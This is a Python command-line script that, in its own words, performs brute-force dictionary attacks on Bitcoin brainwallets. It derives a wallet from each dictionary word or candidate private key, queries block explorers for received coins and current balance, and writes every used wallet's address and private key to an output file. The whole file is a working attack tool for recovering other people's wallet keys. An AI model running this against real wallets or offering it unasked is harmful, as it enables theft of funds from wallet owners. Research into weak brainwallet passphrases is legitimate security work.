import codecs
import io
import sys
import argparse
import logging
import time
from lib.blockchain import Abe, BlockchainInfo, Insight
from lib.wallet import Wallet

def main():
    # Script argument parsing
    parser = argparse.ArgumentParser(description='A script to perform bruteforce dictionary attacks on brainwallets.')
    parser.add_argument('-t', action='store', dest='type',
                        help='Blockchain lookup type ({}|{}|{})'
                        .format(Abe.STRING_TYPE, BlockchainInfo.STRING_TYPE, Insight.STRING_TYPE), required=True)
    parser.add_argument('-d', action='store', dest='dict_file',
                        help='Dictionary file (e.g. dictionary.txt)', required=True)
    parser.add_argument('-o', action='store', dest='output_file',
                        help='Output file (e.g. output.txt)', required=True)
    parser.add_argument('-s', action='store', dest='server',
                        help='Abe server address (e.g. localhost)')
    parser.add_argument('-p', action='store', dest='port',
                        help='Abe port (e.g. 2751)')
    parser.add_argument('-c', action='store', dest='chain',
                        help='Abe chain string (e.g. Bitcoin)')
    parser.add_argument('-k', action='store_true', dest='is_private_key', default=False,
                        help='treat each word as a hex or wif encoded private key, not as brain wallet')
    parser.add_argument('--version', action='version', version='%(prog)s 1.1')
    args = parser.parse_args()

    # Setup logging
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')

    # Check valid blockchain lookup type is specified
    if args.type != BlockchainInfo.STRING_TYPE and args.type != Abe.STRING_TYPE and args.type != Insight.STRING_TYPE:
        logging.error("Invalid -t option specified.")
        sys.exit(1)

    # If abe is selected, make sure required options are given
    if args.type == Abe.STRING_TYPE:
        if not args.server:
            logging.error("Abe server (-s) must be specified.")
            sys.exit(1)
        if not args.port:
            logging.error("Abe port (-p) must be specified.")
            sys.exit(1)
        if not args.chain:
            logging.error("Abe chain (-c) must be specified.")
            sys.exit(1)

    # Choose connection type
    if args.type == Abe.STRING_TYPE:
        blockexplorer = Abe(args.server, args.port, args.chain)
    elif args.type == BlockchainInfo.STRING_TYPE:
        blockexplorer = BlockchainInfo()
    elif args.type == Insight.STRING_TYPE:
        blockexplorer = Insight()
    else:
        logging.error("Invalid lookup type specified '{}'".format(args.type))
        sys.exit(1)

    # Open session
    logging.info("Opening session for {}".format(args.type))
    blockexplorer.open_session()

    # Open dictionary file and validate encoding
    dictionary_encoding = "utf-8"
    logging.info("Opening dictionary file {} and validating encoding is {}".format(args.dict_file, dictionary_encoding))
    try:
        f_dictionary = io.open(args.dict_file, 'rt', encoding=dictionary_encoding)
        f_dictionary.read(4096)
        f_dictionary.close()
    except Exception as e:
        logging.error("Failed to open dictionary file {}. Make sure file is {} encoded.".format(
                        args.dict_file, dictionary_encoding))
        sys.exit(1)

    # Open dictionary file for reading
    logging.info("Opening dictionary file {} for reading".format(args.dict_file))
    try:
        # Open file for reading
        logging.info("Opening file with encoding {}".format(dictionary_encoding))
        f_dictionary = io.open(args.dict_file, 'rt', encoding=dictionary_encoding)
    except Exception as e:
        logging.error("Failed to open dictionary file {}. Error: {}".format(
                        args.dict_file, e.args))
        sys.exit(1)

    # Open output file for found addresses
    file_header = 'dictionary word, received bitcoins, wallet address, private address, current balance'
    logging.info("Opening output file {} for writing".format(args.output_file))
    try:
        f_found_addresses = codecs.open(args.output_file, 'w', dictionary_encoding)
        logging.info(file_header)
        f_found_addresses.writelines(file_header + '\n')
    except Exception as e:
        logging.error("Failed to open output file {}. Error: {}".format(args.found_file, e.args))
        sys.exit(1)

    # Loop through dictionary
    for raw_word in f_dictionary:
        dictionary_word = raw_word.rstrip()
        if not dictionary_word:
            continue

        # Print each word since this is rate limited
        if args.type == BlockchainInfo.STRING_TYPE:
            logging.info(u"Checking wallet '%s'" % dictionary_word)

        # Create wallet
        try:
            wallet = Wallet(dictionary_word, args.is_private_key)
        except Exception as e:
            continue

        # Get received bitcoins
        retry = 0
        retry_count = 6
        sleep_seconds = 10
        while retry < retry_count:
            try:
                received_bitcoins = blockexplorer.get_received(wallet.address)
                break
            except Exception as e:
                logging.warning("Failed to get proper response for received bitcoins. Retry in {} seconds.".format(sleep_seconds))
                time.sleep(sleep_seconds)
                retry += 1
        if retry == retry_count:
            logging.error("Failed to get response for received bitcoins after {} retries. Skipping.".format(retry_count))
            continue
        if received_bitcoins == 0:
            logging.debug("Received bitcoins is zero.. moving on")
            continue

        # Get current balance
        retry = 0
        retry_count = 5
        sleep_seconds = 15
        while retry < retry_count:
            try:
                current_balance = blockexplorer.get_balance(wallet.address)
                break
            except Exception as e:
                logging.warning("Failed to get proper response for balance. Retry in {} seconds.".format(sleep_seconds))
                time.sleep(sleep_seconds)
                retry += 1
        if retry == retry_count:
            logging.error("Failed to get response for balance after {} retries. Skipping.".format(retry_count))
            continue

        # Output results
        output = 'Found used wallet: {},{:.8f},{},{},{:.8f}'.format(dictionary_word, received_bitcoins, wallet.address,
                                                    wallet.private_key, current_balance)
        logging.info(output)
        f_found_addresses.write(output + '\n')

    # Close files and connection
    blockexplorer.close_session()
    f_found_addresses.close()
    f_dictionary.close()

if __name__ == '__main__':
    main()
